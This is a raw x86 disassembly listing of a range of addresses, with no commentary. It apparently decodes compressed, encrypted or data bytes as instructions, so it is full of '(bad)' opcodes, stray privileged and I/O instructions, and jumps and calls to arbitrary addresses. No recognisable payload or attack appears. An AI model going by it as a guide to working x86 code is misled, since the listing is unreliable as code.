  4249ed:	mov    esi,0x0
	...
  424a56:	imul   ebx,DWORD PTR [eax],0x63
  424a59:	push   0x73
  424a5b:	jnp    0x424ac8
  424a5d:	sbb    DWORD PTR [eax-0x5c],ecx
  424a60:	push   esi
  424a61:	xor    dl,dh
  424a63:	enter  0x73d2,0x67
  424a67:	mov    DWORD PTR [ecx],eax
  424a69:	add    BYTE PTR [eax],al
  424a6b:	add    DWORD PTR [eax],eax
  424a6d:	add    BYTE PTR [ecx],al
  424a6f:	outs   dx,DWORD PTR ds:[esi]
  424a70:	jecxz  0x424a6a
  424a72:	jne    0x424abb
  424a74:	mov    edx,ebp
  424a76:	imul   esi,ecx,0xffffffe2
  424a79:	fsubrp st(4),st
  424a7b:	lahf   
  424a7c:	pushf  
  424a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a7e:	hlt    
  424a7f:	cmp    esi,DWORD PTR [ebx]
  424a81:	enter  0xb517,0xab
  424a85:	cdq    
  424a86:	pop    edx
  424a87:	sub    BYTE PTR [ecx-0x57f75be0],ch
  424a8d:	lods   al,BYTE PTR ds:[esi]
  424a8e:	fcomp  QWORD PTR [eax+0x68]
  424a91:	push   edi
  424a92:	stc    
  424a93:	mov    ecx,0x9f01b790
  424a98:	jne    0x424aa9
  424a9a:	sub    edi,DWORD PTR [ebx+esi*4]
  424a9d:	(bad)  
  424a9e:	loop   0x424a3c
  424aa0:	outs   dx,DWORD PTR ds:[esi]
  424aa1:	dec    ecx
  424aa2:	mov    dh,0x49
  424aa4:	sbb    al,0xa9
  424aa6:	call   0x328a57a1
  424aab:	stos   DWORD PTR es:[edi],eax
  424aac:	push   ds
  424aad:	jle    0x424a98
  424aaf:	mov    al,ds:0x64b4a159
  424ab4:	dec    eax
  424ab5:	adc    al,0xfe
  424ab7:	xchg   ecx,eax
  424ab8:	enter  0xc599,0x17
  424abc:	dec    esp
  424abd:	xor    BYTE PTR [edx+0x4d],0xd4
  424ac1:	add    ecx,DWORD PTR [edi+0x32]
  424ac4:	inc    ecx
  424ac5:	outs   dx,BYTE PTR ds:[esi]
  424ac6:	cmp    al,0x8f
  424ac8:	sbb    DWORD PTR [edi-0x6],edi
  424acb:	adc    BYTE PTR [eax-0x66],bh
  424ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424acf:	pop    edx
  424ad0:	inc    ebx
  424ad1:	imul   BYTE PTR [ecx]
  424ad3:	xor    ebp,DWORD PTR [ebx+0x3f]
  424ad6:	scas   eax,DWORD PTR es:[edi]
  424ad7:	sbb    esp,ecx
  424ad9:	dec    ebx
  424ada:	xchg   edx,eax
  424adb:	and    al,0xaa
  424add:	sub    eax,0xef5cb7ae
  424ae2:	inc    ecx
  424ae3:	nop
  424ae4:	je     0x424abf
  424ae6:	sbb    DWORD PTR [edx-0x77fe26c7],esi
  424aec:	or     al,0x52
  424aee:	mov    esi,0xf7fc21e2
  424af3:	xor    DWORD PTR [esi+0x29a1428f],0x6a
  424afa:	leave  
  424afb:	push   esi
  424afc:	mov    eax,DWORD PTR [esi+0x1312b80]
  424b02:	repnz mov ds:0xe80bf5ae,al
  424b08:	cmp    bl,dl
  424b0a:	pop    ecx
  424b0b:	dec    esi
  424b0c:	test   edx,0xc897ad8f
  424b12:	or     cl,ch
  424b14:	xchg   DWORD PTR [edx+esi*1],ebp
  424b17:	xor    edi,ecx
  424b19:	adc    dl,bl
  424b1b:	loopne 0x424ae8
  424b1d:	cmp    cl,BYTE PTR [esi+0x2b]
  424b20:	imul   edx,DWORD PTR [ecx-0x40c4603f],0x59
  424b27:	aam    0x9d
  424b29:	add    ah,dl
  424b2b:	push   esi
  424b2c:	call   0x7ed9:0x67c92df4
  424b33:	pop    ecx
  424b34:	cld    
  424b35:	lds    esi,FWORD PTR [ebp-0x7b]
  424b38:	inc    ebp
  424b39:	mov    al,ds:0xe368989d
  424b3e:	ins    DWORD PTR es:[edi],dx
  424b3f:	int3   
  424b40:	and    al,0x23
  424b42:	fwait
  424b43:	in     eax,dx
  424b44:	cmc    
  424b45:	mov    esp,0x863d8412
  424b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b4b:	push   ecx
  424b4c:	sbb    cl,ch
  424b4e:	test   eax,0x773f7f52
  424b53:	js     0x424ae1
  424b55:	xchg   bh,cl
  424b57:	add    dl,BYTE PTR [edx+ecx*2-0xed85ab5]
  424b5e:	aas    
  424b5f:	sbb    esp,DWORD PTR [edi-0x4e]
  424b62:	cdq    
  424b63:	and    BYTE PTR [ebp+0x3d],0xf3
  424b67:	mov    ch,0x93
  424b69:	jmp    0x0:0x29d9daf7
	...
  424bd4:	add    BYTE PTR [eax],al
  424bd6:	push   es
  424bd7:	aas    
  424bd8:	or     eax,0xb6bb3db9
  424bdd:	mov    edi,0xdc50081e
  424be2:	frstor [ecx+0x32]
  424be5:	inc    ebx
  424be6:	mov    al,BYTE PTR [bx+di]
  424be9:	add    BYTE PTR [eax],al
  424beb:	add    DWORD PTR [eax],eax
  424bed:	add    BYTE PTR [ecx+0x5],al
  424bf0:	pop    edi
  424bf1:	stc    
  424bf2:	sti    
  424bf3:	popfw  
  424bf5:	jp     0x424c68
  424bf7:	push   0x5f
  424bf9:	test   DWORD PTR [esi],0xe5cc4680
  424bff:	jl     0x424c70
  424c01:	cli    
  424c02:	pusha  
  424c03:	loop   0x424bd5
  424c05:	mov    eax,0x798d966c
  424c0a:	cmp    eax,0x89eef6e0
  424c0f:	cmp    ch,BYTE PTR [esi]
  424c11:	(bad)  
  424c12:	repnz xor sp,WORD PTR [esi-0x59]
  424c17:	mov    esi,0x9d5511f7
  424c1c:	fisttp QWORD PTR ds:0x4d69898f
  424c22:	jmp    0xde60e591
  424c27:	pop    eax
  424c28:	dec    ebx
  424c29:	sbb    al,0xb2
  424c2b:	fldcw  WORD PTR [ebp-0x66]
  424c2e:	repz gs lock push ecx
  424c32:	cmp    edi,DWORD PTR [ecx+0x67a9428b]
  424c38:	jnp    0x424c4a
  424c3a:	and    BYTE PTR [ebx+0x731e9d6b],bl
  424c40:	xor    esi,DWORD PTR [eax+0x7a]
  424c43:	ins    BYTE PTR es:[edi],dx
  424c44:	xor    ecx,DWORD PTR [esi+0x1f11f826]
  424c4a:	mov    al,0x5c
  424c4c:	out    0xed,al
  424c4e:	aad    0x40
  424c50:	daa    
  424c51:	out    0xc7,eax
  424c53:	mov    ebx,0xd1552890
  424c58:	call   0x578bd771
  424c5d:	pop    ss
  424c5e:	inc    ebx
  424c5f:	xor    eax,0xfd4ce3e5
  424c64:	adc    edi,DWORD PTR gs:[ebp-0xc]
  424c68:	cwde   
  424c69:	xor    eax,0x9c928039
  424c6e:	shr    DWORD PTR [ebp+0x70],cl
  424c71:	call   0x6a31:0xd5266720
  424c78:	inc    ecx
  424c79:	xor    DWORD PTR [ecx+0x7a6ccc3e],ebp
  424c7f:	loopne 0x424cd2
  424c81:	fistp  WORD PTR [eax]
  424c83:	mov    bh,0x2a
  424c85:	fsub   DWORD PTR [edx-0xd]
  424c88:	rol    DWORD PTR ss:[ebx-0x75],0x3e
  424c8d:	icebp  
  424c8e:	outs   dx,BYTE PTR ds:[esi]
  424c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c90:	ins    BYTE PTR es:[edi],dx
  424c91:	jbe    0x424d04
  424c93:	push   ebx
  424c94:	popf   
  424c95:	mov    ds:0x9d44b30a,eax
  424c9a:	dec    edi
  424c9b:	sti    
  424c9c:	dec    eax
  424c9d:	cld    
  424c9e:	dec    edx
  424c9f:	push   0xffffffaa
  424ca1:	call   0x7ed7f9cd
  424ca6:	loopne 0x424c40
  424ca8:	or     ebp,DWORD PTR [edi-0x45]
  424cab:	xor    esi,DWORD PTR [eax+0x484d4de3]
  424cb1:	dec    ecx
  424cb2:	push   ebp
  424cb3:	mov    al,ds:0x371b2b0f
  424cb8:	xchg   esi,eax
  424cb9:	add    DWORD PTR [ebp-0x6d1045d2],0x53
  424cc0:	sbb    BYTE PTR [eax+0x6a],ah
  424cc3:	xor    BYTE PTR [edx+0x5680f226],ah
  424cc9:	adc    al,0xe6
  424ccb:	dec    ecx
  424ccc:	mov    dh,0x28
  424cce:	out    0x78,al
  424cd0:	or     al,0x38
  424cd2:	sbb    BYTE PTR [ecx-0x3cb9ebac],cl
  424cd8:	mov    bh,0xb9
  424cda:	push   es
  424cdb:	pop    ss
  424cdc:	inc    ebp
  424cdd:	adc    ch,BYTE PTR [ebp+0x11]
  424ce0:	inc    eax
  424ce1:	addr16 dec esp
  424ce3:	iret   
  424ce4:	cmp    al,0xed
  424ce6:	or     al,0xf0
  424ce8:	leave  
  424ce9:	lock adc BYTE PTR ds:0xd335,dl
	...
  424d54:	add    BYTE PTR [eax],al
  424d56:	ins    BYTE PTR es:[edi],dx
  424d57:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424d5e:	bound  ebx,QWORD PTR [ebx-0x2229ae58]
  424d64:	jle    0x424d89
  424d66:	mov    eax,DWORD PTR [bx+di]
  424d69:	add    BYTE PTR [eax],al
  424d6b:	add    DWORD PTR [eax],eax
  424d6d:	add    BYTE PTR [ebp-0x7a1b35b3],ch
  424d73:	leave  
  424d74:	sar    DWORD PTR [edx],cl
  424d76:	test   DWORD PTR [edx+0x58d8e766],esi
  424d7c:	xchg   ebp,eax
  424d7d:	xchg   edx,eax
  424d7e:	sub    edx,esi
  424d80:	mov    al,0xb3
  424d82:	inc    edi
  424d83:	sub    eax,esp
  424d85:	dec    edi
  424d86:	(bad)  
  424d87:	mov    ah,0x1c
  424d89:	xchg   esi,eax
  424d8a:	mov    bh,0x1f
  424d8c:	jnp    0x424d4a
  424d8e:	sub    ebx,DWORD PTR [ecx]
  424d90:	ret    
  424d91:	rcr    BYTE PTR [edi],cl
  424d93:	jmp    0x5e6f3223
  424d98:	test   DWORD PTR [eax+0x6f],eax
  424d9b:	jbe    0x424d99
  424d9d:	je     0x424e19
  424d9f:	mov    esp,0x8e91ced9
  424da4:	jb     0x424d7e
  424da6:	rol    DWORD PTR [ecx+0x7efc3361],0xbf
  424dad:	sub    al,0xc
  424daf:	idiv   BYTE PTR [ecx+0x71c89d90]
  424db5:	push   esp
  424db6:	scas   al,BYTE PTR es:[edi]
  424db7:	push   0x6dc3b9d7
  424dbc:	xchg   edi,eax
  424dbd:	dec    edi
  424dbe:	test   BYTE PTR [ecx],ah
  424dc0:	cmp    DWORD PTR [eax],esi
  424dc2:	repnz mov ds:0xe0fc7027,al
  424dc8:	push   cs
  424dc9:	push   esp
  424dca:	jb     0x424e08
  424dcc:	int3   
  424dcd:	xor    DWORD PTR [ebx],esp
  424dcf:	sahf   
  424dd0:	jns    0x424d9a
  424dd2:	mov    edi,0x8b746fd7
  424dd7:	test   eax,0x4f10d6f9
  424ddc:	or     eax,0x6b8d8bb1
  424de1:	pop    esp
  424de2:	(bad)  [edi-0x2f9c4c41]
  424de8:	sbb    edx,ebp
  424dea:	adc    DWORD PTR [edx+0x2afc195a],ebp
  424df0:	sti    
  424df1:	int    0x77
  424df3:	push   eax
  424df4:	clc    
  424df5:	lea    eax,[ebp-0x67fbe72b]
  424dfb:	clc    
  424dfc:	and    DWORD PTR [ecx+0x6f],eax
  424dff:	push   edi
  424e00:	loop   0x424dfb
  424e02:	mov    ds:0x652ca5b4,al
  424e07:	jmp    0x40d2:0x1fe9ee94
  424e0e:	call   0xc5c3c281
  424e13:	and    al,dl
  424e15:	shr    BYTE PTR [edi],0x9e
  424e18:	sar    DWORD PTR [ebx+0x2205607a],1
  424e1e:	adc    eax,0x6464ace6
  424e23:	mov    al,0x2a
  424e25:	and    ecx,edx
  424e27:	inc    edi
  424e28:	pop    eax
  424e29:	mov    al,ds:0x82015eb
  424e2e:	adc    dl,ah
  424e30:	adc    eax,0xfe5d3180
  424e35:	test   BYTE PTR [esi-0x6de47b89],dh
  424e3b:	ret    0xc354
  424e3e:	stos   BYTE PTR es:[edi],al
  424e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e40:	or     edx,DWORD PTR [ebx]
  424e42:	cmp    al,0xf4
  424e44:	pushf  
  424e45:	dec    eax
  424e46:	fistp  WORD PTR [ebx]
  424e48:	addr16 mov edx,0x15c84755
  424e4e:	push   edx
  424e4f:	mov    DWORD PTR [eax+0x34],0x390e57e5
  424e56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424e57:	inc    esp
  424e58:	and    DWORD PTR [ecx+esi*2-0x42b053a2],0x1d42925
  424e63:	mov    ds:0x70838595,ax
  424e69:	leave  
  424e6a:	imul   edi,esp,0xb864
	...
  424ed4:	add    BYTE PTR [eax],al
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424edb
  424ee3:	das    
  424ee4:	jl     0x424eb4
  424ee6:	mov    WORD PTR [bx+di],es
  424ee9:	add    BYTE PTR [eax],al
  424eeb:	add    DWORD PTR [eax],eax
  424eed:	add    BYTE PTR [esp+ebp*2+0x3a],ah
  424ef1:	cwde   
  424ef2:	leave  
  424ef3:	sub    DWORD PTR [esi],0x6
  424ef6:	fsubr  DWORD PTR [ebp+0x23]
  424ef9:	adc    ebp,DWORD PTR [esi-0x41c06801]
  424eff:	in     al,dx
  424f00:	xor    al,0xa6
  424f02:	ss adc dl,ch
  424f05:	ret    
  424f06:	xchg   DWORD PTR ds:0x415e094,esp
  424f0c:	cmp    eax,0xbd998e2b
  424f11:	add    DWORD PTR [edi-0x36],ebx
  424f14:	push   ss
  424f15:	inc    ecx
  424f16:	mov    al,0x2a
  424f18:	add    edx,DWORD PTR [esi+0x57]
  424f1b:	xor    al,0x5d
  424f1d:	cwde   
  424f1e:	sbb    DWORD PTR gs:[esi+edx*8-0x30a09afb],edi
  424f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f27:	mov    esp,0xd91ba7a4
  424f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f2d:	push   0x3b6f237e
  424f32:	dec    esp
  424f33:	fnsave [edi]
  424f35:	or     ecx,ebp
  424f37:	pop    ebp
  424f38:	not    ebp
  424f3a:	push   esp
  424f3b:	add    bl,BYTE PTR [eax+0x3696cf04]
  424f41:	pop    ebx
  424f42:	(bad)  
  424f43:	(bad)  
  424f44:	xor    eax,0xfaca40f8
  424f49:	jb     0x424ed8
  424f4b:	pop    esp
  424f4c:	(bad)  
  424f4d:	(bad)  
  424f4f:	push   0xffffffc5
  424f51:	les    esi,FWORD PTR [eax-0x3a]
  424f54:	(bad)  
  424f55:	xchg   esi,eax
  424f56:	test   al,0x98
  424f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424f59:	inc    edx
  424f5a:	das    
  424f5b:	lock xchg edi,eax
  424f5d:	iret   
  424f5e:	inc    edx
  424f5f:	scas   al,BYTE PTR es:[edi]
  424f60:	in     eax,0x83
  424f62:	fnstcw WORD PTR [edi]
  424f64:	aas    
  424f65:	mov    BYTE PTR [eax],bh
  424f67:	imul   ecx,DWORD PTR ds:0x4f422a52,0xffffff8d
  424f6e:	std    
  424f6f:	sbb    BYTE PTR [ebp+0x14],0xff
  424f73:	inc    ebx
  424f74:	lea    esi,[ebx]
  424f76:	adc    ah,dl
  424f78:	sub    BYTE PTR [ecx+ebp*4],al
  424f7b:	loopne 0x424fd1
  424f7d:	int3   
  424f7e:	cmp    eax,DWORD PTR [esi+eax*2]
  424f81:	or     esi,DWORD PTR [edi+0x49]
  424f84:	jg     0x424fdb
  424f86:	ret    
  424f87:	push   DWORD PTR [bp+di+0x43]
  424f8b:	lock xor DWORD PTR [edx-0x4a2409c],ebp
  424f92:	leave  
  424f93:	and    DWORD PTR [ecx],edx
  424f95:	or     edi,ecx
  424f97:	jecxz  0x424f93
  424f99:	adc    BYTE PTR [ebx],0xb0
  424f9c:	mov    ecx,0xd5ffb510
  424fa1:	push   cs
  424fa2:	sub    BYTE PTR [ebx-0x1a4687af],al
  424fa8:	mov    cl,0x8a
  424faa:	mov    bl,0xe5
  424fac:	push   ecx
  424fad:	test   BYTE PTR ss:[ecx],dh
  424fb0:	addr16 es stc 
  424fb3:	test   eax,0xba394e6b
  424fb8:	add    eax,0x9ce73d03
  424fbd:	mov    al,ds:0x5d2aa1bf
  424fc2:	(bad)
  424fc7:	jl     0x424ff6
  424fc9:	jmp    0x6e94e79d
  424fce:	iret   
  424fcf:	jae    0x42501e
  424fd1:	sub    eax,0xb4d3830e
  424fd6:	inc    eax
  424fd7:	(bad)  
  424fd8:	pop    ebp
  424fd9:	inc    esi
  424fda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fdb:	sbb    bl,BYTE PTR [esi-0x378be5cf]
  424fe1:	sub    ah,BYTE PTR [edx+0x0]
  424fe4:	or     BYTE PTR [edx+0x7fb0f060],dh
  424fea:	stc    
  424feb:	xchg   ebp,eax
  424fec:	push   es
  424fed:	pop    ecx
	...
  425056:	dec    ebx
  425057:	push   ss
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	clc    
  425063:	adc    eax,0x8d671ef2
  425068:	add    DWORD PTR [eax],eax
  42506a:	add    BYTE PTR [ecx],al
  42506c:	add    BYTE PTR [eax],al
  42506e:	cmc    
  42506f:	or     dh,BYTE PTR [eax-0x6d]
  425072:	(bad)  
  425073:	in     al,dx
  425074:	xchg   edx,eax
  425075:	mov    ah,0x2f
  425077:	scas   eax,DWORD PTR es:[edi]
  425078:	jp     0x42505f
  42507a:	in     al,dx
  42507b:	push   cs
  42507c:	mov    ebp,0x6e3ecff0
  425081:	mov    esp,0xf8e9289d
  425086:	fisttp QWORD PTR [edi+0x6ffd05a1]
  42508c:	xor    edx,DWORD PTR [edx-0x1aa108ef]
  425092:	test   eax,0xff473d0c
  425098:	inc    edi
  425099:	mov    eax,0xa91e2ced
  42509e:	sub    BYTE PTR [ecx+0x57],ah
  4250a1:	aas    
  4250a2:	inc    eax
  4250a3:	xchg   BYTE PTR [ebx],bh
  4250a5:	pop    ss
  4250a6:	leave  
  4250a7:	pushf  
  4250a8:	push   edi
  4250a9:	cmp    al,0xd0
  4250ab:	push   0xffffffc8
  4250ad:	scas   al,BYTE PTR es:[edi]
  4250ae:	and    BYTE PTR [edi+0x7],cl
  4250b1:	mov    esp,0xf71c9e4e
  4250b6:	jo     0x425134
  4250b8:	jo     0x425111
  4250ba:	(bad)
  4250bf:	mov    al,0x3b
  4250c1:	std    
  4250c2:	ja     0x4250a0
  4250c4:	sbb    eax,0x8f05d809
  4250c9:	mov    ch,ah
  4250cb:	sbb    eax,0x6a72a9d3
  4250d0:	xor    ah,bh
  4250d2:	mov    cl,ah
  4250d4:	scas   al,BYTE PTR es:[edi]
  4250d5:	push   cs
  4250d6:	bound  ebp,QWORD PTR [esi]
  4250d8:	mov    edx,0xa4566235
  4250dd:	inc    esp
  4250de:	mov    al,ds:0x13ba9ab4
  4250e3:	pop    esp
  4250e4:	mov    ebx,0xa8c4983d
  4250e9:	test   al,0xad
  4250eb:	stos   DWORD PTR es:[edi],eax
  4250ec:	pop    edi
  4250ed:	pop    ss
  4250ee:	shl    BYTE PTR [ebp-0x50],1
  4250f1:	ffree  st(6)
  4250f3:	cmpunordps xmm2,XMMWORD PTR [ecx]
  4250f7:	sbb    DWORD PTR [ebp-0x67cf7925],edx
  4250fd:	rcr    BYTE PTR [edi],cl
  4250ff:	rol    ch,cl
  425101:	or     al,0x53
  425103:	add    al,0xf
  425105:	mov    bh,BYTE PTR [ebx+esi*1]
  425108:	jmp    0xd522cd3
  42510d:	and    eax,0x41fe6f1e
  425112:	push   edi
  425113:	xor    DWORD PTR [edi+0x2],esi
  425116:	mov    es,WORD PTR [edx-0x6]
  425119:	int3   
  42511a:	fadd   QWORD PTR [edi-0x19]
  42511d:	str    WORD PTR [ebx+0x2ac1c1db]
  425124:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425126:	icebp  
  425127:	add    esp,DWORD PTR [eax+0x452d0997]
  42512d:	sbb    DWORD PTR [esi+eax*4-0x3d],eax
  425131:	cmove  esp,edx
  425134:	fndisi(8087 only) 
  425136:	aaa    
  425137:	pop    eax
  425138:	and    esi,DWORD PTR [ebx-0x1]
  42513b:	div    BYTE PTR [edi+eiz*1-0x48d91e7c]
  425142:	cmp    ah,BYTE PTR [ebp+0x45c5df5f]
  425148:	xchg   edx,eax
  425149:	jge    0x42511d
  42514b:	xchg   esp,eax
  42514c:	dec    edi
  42514d:	pushf  
  42514e:	mov    al,ds:0x68ca1127
  425153:	test   eax,0x8d598a0d
  425158:	mov    ah,0xd1
  42515a:	pop    es
  42515b:	out    dx,al
  42515c:	mov    al,ds:0xd59a85a8
  425162:	jge    0x425179
  425164:	pushf  
  425165:	xchg   esp,eax
  425166:	push   eax
  425167:	add    DWORD PTR [edi],esi
  425169:	ins    DWORD PTR es:[di],dx
  42516b:	test   eax,0xaca5
	...
  4251d4:	add    BYTE PTR [eax],al
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x8ab1:0x41be92e8
  4251e6:	mov    es,WORD PTR [bx+di]
  4251e9:	add    BYTE PTR [eax],al
  4251eb:	add    DWORD PTR [eax],eax
  4251ed:	add    dh,bl
  4251ef:	push   ebx
  4251f0:	pop    eax
  4251f1:	add    DWORD PTR [edx],0x93f44263
  4251f7:	retf   0x89d1
  4251fa:	push   ebp
  4251fb:	and    DWORD PTR [ecx],ecx
  4251fd:	pop    edi
  4251fe:	lea    esi,[ecx+ebp*4]
  425201:	repz mov ebx,DWORD PTR [edi-0x671c21]
  425208:	lods   al,BYTE PTR ds:[esi]
  425209:	add    cl,BYTE PTR [ebp-0x21]
  42520c:	jae    0x425228
  42520e:	loopne 0x4251a8
  425210:	xchg   ebp,eax
  425211:	data16 icebp 
  425213:	dec    edi
  425214:	or     bl,dl
  425216:	cld    
  425217:	or     al,bh
  425219:	cs add eax,0x5dd0c12c
  42521f:	frndint 
  425222:	rol    BYTE PTR [edi+ebx*4],cl
  425225:	xchg   ecx,eax
  425226:	pop    esp
  425227:	pop    ebp
  425228:	scas   eax,DWORD PTR es:[edi]
  425229:	test   eax,0x5df6f343
  42522e:	mov    dl,0x9
  425230:	scas   al,BYTE PTR es:[edi]
  425231:	xchg   ebx,eax
  425232:	loope  0x42520a
  425234:	rcr    ebx,1
  425236:	jge    0x42528d
  425238:	jnp    0x4251e3
  42523a:	pusha  
  42523b:	jge    0x425256
  42523d:	mov    ds:0x405a67ae,al
  425242:	dec    ch
  425244:	xor    eax,0xcca3c575
  425249:	rol    esi,1
  42524b:	call   0x505c1c50
  425250:	ss popa 
  425252:	out    dx,eax
  425253:	adc    eax,0x7861e56a
  425258:	pop    ss
  425259:	push   ds
  42525a:	in     al,0x50
  42525c:	jno    0x4252db
  42525e:	xor    al,0xff
  425260:	jns    0x425201
  425262:	(bad)  
  425263:	push   cs
  425264:	push   esp
  425265:	loope  0x42520e
  425267:	lea    ebp,[ebx+0x22]
  42526a:	rol    DWORD PTR [esp+edx*4-0x6615aa4e],1
  425271:	retf   
  425272:	leave  
  425273:	mov    ah,0xd9
  425275:	mov    DWORD PTR [eax],edi
  425277:	in     al,0x28
  425279:	cmp    ah,dh
  42527b:	add    DWORD PTR [edx+ebp*8],ebp
  42527e:	xchg   esp,eax
  42527f:	pop    esp
  425280:	sbb    ebx,ebp
  425282:	int3   
  425283:	mov    esi,gs
  425285:	xchg   esi,eax
  425286:	and    cl,BYTE PTR [edx-0xd]
  425289:	rol    DWORD PTR [edx+edx*4],1
  42528c:	fsubrp st(5),st
  42528e:	pop    ss
  42528f:	mov    ebx,ebx
  425291:	loopne 0x4252f6
  425293:	sbb    ah,BYTE PTR [ebp+eiz*4-0x2e067a82]
  42529a:	fnstenv [ebp+0x6f]
  42529d:	mov    DWORD PTR [esi+edx*8-0x7df699e7],edx
  4252a4:	std    
  4252a5:	pop    ebp
  4252a6:	sub    DWORD PTR [ebp+0x6c],ecx
  4252a9:	mov    eax,ds:0xbbc26052
  4252ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252af:	popf   
  4252b0:	xor    bh,al
  4252b2:	or     DWORD PTR [ebp+0x1a0123d5],edx
  4252b8:	jg     0x42526c
  4252ba:	ins    BYTE PTR es:[edi],dx
  4252bb:	cmp    al,0x5
  4252bd:	jge    0x4252ec
  4252bf:	cs adc ch,bl
  4252c2:	cdq    
  4252c3:	(bad)  
  4252c5:	je     0x4252c5
  4252c7:	out    0xcd,al
  4252c9:	xlat   BYTE PTR ds:[ebx]
  4252ca:	xchg   edi,eax
  4252cb:	sbb    bl,cl
  4252cd:	xchg   edi,eax
  4252ce:	or     al,0x90
  4252d1:	dec    eax
  4252d2:	xor    BYTE PTR [edi-0x62],bh
  4252d5:	jae    0x425313
  4252d7:	fstp   QWORD PTR [eax+0x274f0abf]
  4252dd:	aam    0x1
  4252df:	imul   ebx,esp,0xfe2ca930
  4252e5:	pop    ebx
  4252e6:	aas    
  4252e7:	xchg   edi,eax
  4252e8:	inc    esp
  4252e9:	out    0x51,al
  4252eb:	jp     0x425336
  4252ed:	fild   DWORD PTR [eax]
	...
  425353:	add    BYTE PTR [eax],al
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	lods   al,BYTE PTR ds:[esi]
  425363:	push   0x8f6752b9
  425368:	add    DWORD PTR [eax],eax
  42536a:	add    BYTE PTR [ecx],al
  42536c:	add    BYTE PTR [eax],al
  42536e:	in     eax,dx
  42536f:	dec    eax
  425370:	mov    cl,0x17
  425372:	in     al,dx
  425373:	(bad)  
  425374:	or     eax,0xed70b5cb
  425379:	add    dl,BYTE PTR [edx-0x5c]
  42537c:	cmp    DWORD PTR [ecx],0x34a0d656
  425382:	jl     0x425343
  425384:	sub    ah,BYTE PTR [edx-0x10]
  425387:	mov    al,ds:0x3b7aba1c
  42538c:	jne    0x4253a2
  42538e:	jmp    0x4253fa
  425390:	jo     0x4253d8
  425392:	jle    0x4253b6
  425394:	xor    ch,bh
  425396:	lods   eax,DWORD PTR ds:[esi]
  425397:	or     BYTE PTR [eax+0x15c9d1fa],ah
  42539d:	jo     0x42532c
  42539f:	lods   al,BYTE PTR ds:[esi]
  4253a0:	push   cs
  4253a1:	jl     0x4253a3
  4253a3:	push   0xa4aebf16
  4253a8:	or     eax,0xc19e4232
  4253ad:	mov    WORD PTR ss:[ecx],es
  4253b0:	sub    ecx,ebx
  4253b2:	mov    al,0x9c
  4253b4:	test   al,0xd6
  4253b6:	bound  ecx,QWORD PTR [esi+0x6b]
  4253b9:	fld    DWORD PTR [eax+0x31051a87]
  4253bf:	jg     0x4253a7
  4253c1:	xor    dh,BYTE PTR [edx]
  4253c3:	je     0x42542a
  4253c5:	aas    
  4253c6:	push   ss
  4253c7:	mov    ah,0xdb
  4253c9:	dec    BYTE PTR [edi*1+0x4ea38475]
  4253d0:	fs sub al,0x6a
  4253d3:	gs xor al,0x8a
  4253d6:	sub    bh,bl
  4253d8:	mov    ebx,0x7a73ddc8
  4253dd:	or     ah,BYTE PTR [ebp-0x4eb4ff06]
  4253e3:	add    BYTE PTR [eax],ch
  4253e5:	test   al,0xb
  4253e7:	ror    DWORD PTR [ecx+edi*8],1
  4253ea:	fistp  WORD PTR [edi+0x37]
  4253ed:	pop    esp
  4253ee:	inc    ecx
  4253ef:	daa    
  4253f0:	add    al,bh
  4253f2:	jne    0x425460
  4253f4:	lea    edi,[ebp+0x4a7b042a]
  4253fa:	xchg   edx,eax
  4253fb:	push   edi
  4253fc:	stos   BYTE PTR es:[edi],al
  4253fd:	mov    DWORD PTR [esi+0x54d40b1e],esp
  425403:	fcomp  DWORD PTR [ebx-0x855d772]
  425409:	imul   DWORD PTR [ecx+edx*1]
  42540c:	sub    DWORD PTR [edi],esi
  42540e:	ficom  DWORD PTR [edi+0x3d]
  425411:	std    
  425412:	push   ebx
  425413:	adc    dh,bl
  425415:	mov    bl,0x31
  425417:	dec    edx
  425418:	pop    ss
  425419:	mov    edi,0x5c186d4d
  42541e:	stos   DWORD PTR es:[edi],eax
  42541f:	ins    BYTE PTR es:[edi],dx
  425420:	jns    0x4253ef
  425422:	add    DWORD PTR [edi+ebx*1-0x6d],eax
  425426:	ret    0x55b0
  425429:	fnsave [esi+0x6e80de58]
  42542f:	(bad)  
  425430:	push   eax
  425431:	mov    dl,0xb
  425433:	retf   0x7eb
  425436:	(bad)  
  42543b:	xor    esp,DWORD PTR [eax]
  42543d:	and    eax,0x78a27992
  425442:	adc    DWORD PTR [ecx-0x26a98ff2],ebx
  425448:	xchg   ebx,eax
  425449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42544a:	xchg   BYTE PTR [ecx-0x6],dh
  42544d:	jge    0x4254a5
  42544f:	int    0x72
  425451:	sar    DWORD PTR [edi+0x24],0x25
  425455:	jns    0x4254cf
  425457:	shl    BYTE PTR [edx+0x3d],0x31
  42545b:	mov    esi,0x558117e6
  425460:	lods   al,BYTE PTR ds:[esi]
  425461:	push   0x761ed6e7
  425466:	lock pop edi
  425468:	dec    ebx
  425469:	sub    eax,0x49118342
	...
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
